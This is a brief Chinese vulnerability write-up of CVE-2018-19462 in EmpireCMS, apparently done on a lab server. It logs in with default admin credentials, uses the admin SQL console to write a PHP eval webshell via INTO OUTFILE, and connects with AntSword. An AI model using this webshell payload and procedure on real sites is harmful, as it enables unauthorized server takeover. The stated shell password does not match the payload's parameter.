# EmpireCMS代码注入(CVE-2018-19462)
## 漏洞描述
EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。

## 影响版本
EmpireCMS<=7.5

## 利用流程
1.访问地址：http://118.193.36.37:60736/empirecms/e/admin/ 并登录admin/123456
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/EmpireCMS%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5(CVE-2018-19462)/1.jpg)
2.点击系统 -> 备份与恢复数据 -> 执行SQL语句：
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/EmpireCMS%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5(CVE-2018-19462)/2.jpg)
3.尝试写入一句话木马：
```
select '<?php @eval($_POST[1])?>' into outfile 'Path/shell.php'
```
构造尝试Path，直到试出正确地址
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/EmpireCMS%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5(CVE-2018-19462)/3.jpg)
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/EmpireCMS%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5(CVE-2018-19462)/4.jpg)
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/EmpireCMS%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5(CVE-2018-19462)/5.jpg)
```
select '<?php @eval($_POST[1])?>' into outfile '/var/www/html/shell.php'
```
4.尝试连接一句话木马：
```
http://118.193.36.37:60736/shell.php
```
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/EmpireCMS%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5(CVE-2018-19462)/6.jpg)
5.蚁剑连接 
```
http://118.193.36.37:60736/shell.php	密码a
```
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/EmpireCMS%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5(CVE-2018-19462)/7.jpg)
